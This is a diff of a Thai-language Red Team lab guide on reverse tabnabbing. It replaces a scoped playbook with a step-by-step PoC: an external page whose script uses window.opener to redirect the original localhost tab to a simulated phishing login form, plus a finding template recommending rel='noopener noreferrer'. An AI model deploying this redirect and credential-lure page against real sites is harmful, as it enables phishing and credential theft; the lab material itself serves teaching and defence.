@@ -1,138 +1,175 @@
-# Red Team Playbook — Reverse Tabnabbing
+# Part 2 — Red Team: ตรวจจาก External Site และสร้าง PoC
 
-คู่มือนี้ใช้ฝึกกระบวนการคิดและการทำงานของ Red Team ภายใน EP01 Lab เท่านั้น เป้าหมายคือพิสูจน์ความเสี่ยงอย่างปลอดภัยและส่งมอบหลักฐานที่ Blue Team นำไปแก้ไขได้
+บทนี้จำลองว่า Red Team ได้รับอนุญาตให้ควบคุม External Site บน Port `9000`
 
-## 1. Rules of Engagement
+> Hacker ทั่วไปไม่สามารถโจมตีได้เพียงเพราะเห็น External Link แต่ต้องควบคุมปลายทาง, เจาะปลายทางได้ หรือมีวิธีรัน JavaScript บนปลายทางก่อน
 
-ก่อนทดสอบให้กำหนดขอบเขต
+## Architecture
 
-| รายการ | ขอบเขตของ Lab |
-| --- | --- |
-| Target | `http://localhost:8000` |
-| อนุญาต | ตรวจ Source Code, ทดสอบ `window.opener`, เปลี่ยนแท็บเดิมไปหน้า Phishing จำลอง |
-| ไม่อนุญาต | เว็บไซต์ภายนอก, Credential จริง, การเผยแพร่หน้า Phishing, Social Engineering กับบุคคลอื่น |
-| Test Data | ข้อมูลสมมติเท่านั้น |
-| Stop Condition | หยุดทันทีเมื่อออกนอก `localhost` หรือพบข้อมูลจริง |
-
-## 2. Mission
-
-พิสูจน์ว่า External Page ที่เปิดจาก Target สามารถควบคุมแท็บต้นทาง และอธิบาย Business Impact โดยไม่รับหรือบันทึกข้อมูลผู้ใช้
-
-เงื่อนไขสำเร็จ:
-- ระบุลิงก์ที่เปิดแท็บใหม่และยังคง `window.opener` ได้
-- แสดงว่าแท็บใหม่มองเห็น `window.opener`
-- เปลี่ยนแท็บเดิมไปยัง `phishing.html` ได้
-- เก็บหลักฐานและเขียนคำแนะนำแก้ไข
-
-## 3. Reconnaissance
-
-### ตรวจ Source Code
-
-ค้นหาลิงก์ที่ใช้ `target="_blank"`
-
-```bash
-rg -n 'target="_blank"' .
+```text
+Trusted Site : http://localhost:8000/trusted-site/
+External Site: http://localhost:9000/external-site/
 ```
 
-ตรวจแต่ละผลลัพธ์ว่า
-- มี `rel="noopener"` หรือไม่
-- มีการระบุ `rel="opener"` หรือไม่
-- URL ปลายทางอยู่ภายใต้การควบคุมของใคร
-- หน้าต้นทางเกี่ยวข้องกับ Login, Account หรือข้อมูลสำคัญหรือไม่
+## ไฟล์ที่ Red Team สร้าง
 
-### ตรวจใน Browser
+```text
+demo/external-site/
+├── index.html       # External Site และ JavaScript Payload
+└── phishing.html    # หน้า Phishing จำลอง
+```
 
-ที่หน้า External Site เปิด DevTools Console แล้วตรวจ
+## 1. สร้าง External Site แบบปกติก่อน
+
+สร้าง `external-site/index.html`
+
+```html
+<!doctype html>
+<html lang="th">
+<head>
+  <meta charset="utf-8">
+  <title>Partner Security Blog</title>
+</head>
+<body>
+  <h1>Partner Security Blog</h1>
+  <p>External Site สำหรับ Lab</p>
+</body>
+</html>
+```
+
+เปิด Terminal อีกหน้าที่โฟลเดอร์ `demo`
+
+```bash
+python -m http.server 9000
+```
+
+ตอนนี้ Trusted Site และ External Site ทำงานพร้อมกันคนละ Origin
+
+## 2. ตรวจช่องโหว่จากฝั่ง External Site
+
+1. เปิด Trusted Site ที่ Port `8000`
+2. กด External Link เพื่อเปิด Port `9000` ในแท็บใหม่
+3. ที่ External Site เปิด DevTools Console
+4. รัน
 
 ```js
 Boolean(window.opener)
 ```
 
-- `true` หมายถึงหน้าใหม่ยังมี Reference ไปยังแท็บเดิม
-- `false` หมายถึงไม่มี Reference ผ่าน `window.opener`
+หากผลเป็น `true` แปลว่า External Site มี Reference กลับไปยัง Trusted Site
 
-## 4. Exploitation ใน Lab
+นี่คือจุดที่ Red Team ยืนยันช่องโหว่จากฝั่ง External Site โดยยังไม่ต้องแก้ Source ของ Trusted Site
 
-1. เริ่ม Web Server ตาม README ของ EP01
-2. เปิดหน้า **Vulnerable**
-3. เปิด External Site ในแท็บใหม่
-4. ยืนยันว่าหน้าแสดง **พบ window.opener**
-5. กด **จำลอง Reverse Tabnabbing**
-6. ยืนยันว่าแท็บเดิมเปลี่ยนไปยัง `phishing.html`
+## 3. เพิ่ม Payload ใน External Site
 
-กลไกที่ใช้ใน Lab:
+เพิ่มส่วนนี้ใน `external-site/index.html`
 
-```js
-if (window.opener && !window.opener.closed) {
-  window.opener.location.href = "phishing.html";
-}
+```html
+<p id="status"></p>
+<p id="countdown"></p>
+
+<script>
+  const status = document.querySelector("#status");
+  const countdown = document.querySelector("#countdown");
+  const hasOpener = Boolean(window.opener && !window.opener.closed);
+
+  if (!hasOpener) {
+    status.textContent = "ไม่พบ window.opener";
+  } else {
+    status.textContent = "พบ window.opener";
+    countdown.textContent = "เปลี่ยนแท็บต้นทางใน 3 วินาที";
+
+    setTimeout(() => {
+      const phishingUrl = new URL("phishing.html", location.href);
+      window.opener.location.href = phishingUrl.href;
+    }, 3000);
+  }
+</script>
 ```
 
-PoC ต้องหยุดเพียงการเปลี่ยนหน้า ห้ามเพิ่มการรับ Password, Cookie, Token หรือข้อมูลส่วนบุคคล
+### Payload ทำอะไร
 
-## 5. Evidence Collection
+1. ตรวจ `window.opener` จาก External Site
+2. สร้าง URL ของหน้า Phishing บน Port `9000`
+3. เปลี่ยน Trusted Tab ให้ไปยัง URL นั้น
 
-เก็บหลักฐานให้ Blue Team ทำซ้ำได้
+Cross-Origin ป้องกัน External Site จากการอ่าน DOM ของ Trusted Site แต่การสั่ง Navigation ผ่าน `window.opener.location` คือพฤติกรรมที่ Lab ต้องการสาธิต
 
-| หลักฐาน | สิ่งที่ควรบันทึก |
-| --- | --- |
-| Affected Page | URL และชื่อไฟล์ที่มีลิงก์เสี่ยง |
-| Vulnerable Code | บรรทัดที่มี `target="_blank"` และค่า `rel` |
-| Browser Result | ผลของ `Boolean(window.opener)` |
-| Impact | URL ของแท็บเดิมก่อนและหลัง PoC |
-| Environment | Browser และ Version ที่ใช้ทดสอบ |
-| Scope | ยืนยันว่าทดสอบบน `localhost` |
+## 4. สร้าง `external-site/phishing.html`
 
-หลีกเลี่ยง Screenshot ที่มีข้อมูลจริงหรือข้อมูลส่วนตัว
+```html
+<!doctype html>
+<html lang="th">
+<head>
+  <meta charset="utf-8">
+  <title>Phishing Simulation</title>
+</head>
+<body>
+  <h1>Session หมดอายุ</h1>
+  <p>กรอกข้อมูลมั่วเท่านั้น</p>
 
-## 6. Risk Analysis
+  <form id="login" autocomplete="off">
+    <input name="username" placeholder="demo-user" required>
+    <input name="password" type="password" placeholder="fake-password" required>
+    <button>ส่งข้อมูลสมมติ</button>
+  </form>
 
-ประเมินความเสี่ยงตามบริบท ไม่ใช่เพียงการมี `target="_blank"`
+  <pre id="result"></pre>
 
-ความเสี่ยงสูงขึ้นเมื่อ
-- ลิงก์ปลายทางเป็น Domain ที่องค์กรควบคุมไม่ได้
-- หน้าต้นทางเป็นหน้า Login, Account หรือ Admin
-- ผู้ใช้มีแนวโน้มกลับมาใช้แท็บเดิมภายหลัง
-- หน้า Phishing สามารถเลียนแบบ Brand หรือเส้นทาง Login ได้แนบเนียน
+  <script>
+    const form = document.querySelector("#login");
+    const result = document.querySelector("#result");
 
-ความเสี่ยงลดลงเมื่อ Browser ตัด `window.opener` โดยค่าเริ่มต้น แต่รายงานยังควรแนะนำการป้องกันใน Code อย่างชัดเจนเพื่อรองรับ Browser และ WebView ที่หลากหลาย
+    form.addEventListener("submit", (event) => {
+      event.preventDefault();
+      const data = new FormData(form);
 
-## 7. Finding Template
+      result.textContent =
+        `Username: ${data.get("username")}\n` +
+        `Password: ${data.get("password")}`;
+    });
+  </script>
+</body>
+</html>
+```
+
+ข้อมูลอยู่ใน Browser เท่านั้น ไม่มี `fetch`, Backend, Database หรือ Storage
+
+## 5. Execute PoC
+
+1. เปิด Trusted Site บน Port `8000`
+2. เปิด External Site ผ่านลิงก์
+3. ยืนยันว่า External Site พบ `window.opener`
+4. รอ 3 วินาที
+5. กลับแท็บเดิม
+6. URL ต้องเปลี่ยนจาก Port `8000` ไปหน้า Phishing บน Port `9000`
+7. กรอกข้อมูลสมมติและตรวจผล
+
+## 6. Evidence
+
+- URL Trusted Site และ External Site
+- ค่า `Boolean(window.opener)`
+- Source ของ External Link
+- URL ก่อนและหลัง Redirect
+- Browser และ Version
+- Screenshot ที่ใช้ข้อมูลสมมติเท่านั้น
+
+## 7. Finding
 
 ```markdown
 ## Reverse Tabnabbing ผ่าน External Link
 
-Severity: Low / Medium / High ตามบริบท
-Affected URL/File:
-Test Environment:
+### Preconditions
+Attacker ต้องควบคุมหรือรัน JavaScript บน External Site ได้
 
-### Description
-อธิบายว่าหน้าใหม่ได้รับ window.opener อย่างไร
-
-### Steps to Reproduce
-1. ...
-2. ...
-
-### Evidence
-- Vulnerable code:
-- window.opener result:
-- Original tab before/after:
+### Root Cause
+Trusted Site เปิด External Site โดยไม่แยก window.opener
 
 ### Impact
-อธิบายสถานการณ์ Phishing หรือ Brand Impersonation ที่เป็นไปได้
+External Site สามารถเปลี่ยน Trusted Tab เป็นหน้า Phishing
 
 ### Recommendation
-เพิ่ม rel="noopener noreferrer" และ Regression Test
+ใช้ rel="noopener noreferrer" และเพิ่ม Regression Test
 ```
 
-## 8. Handoff ให้ Blue Team
-
-ส่งมอบเฉพาะข้อมูลที่จำเป็น:
-
-- ตำแหน่ง Code ที่ได้รับผลกระทบ
-- ขั้นตอนทำซ้ำที่ชัดเจน
-- Browser ที่ใช้ทดสอบ
-- ผลกระทบตามบริบทของระบบ
-- Acceptance Criteria หลังแก้ไข
-
-Acceptance Criteria ที่แนะนำ: External Page ต้องได้ผล `Boolean(window.opener) === false` และแท็บต้นทางต้องไม่เปลี่ยนเมื่อรัน PoC เดิม
+ส่ง Finding และ PoC ให้ Blue Team โดยไม่แก้ Trusted Site ในช่วง Red Team
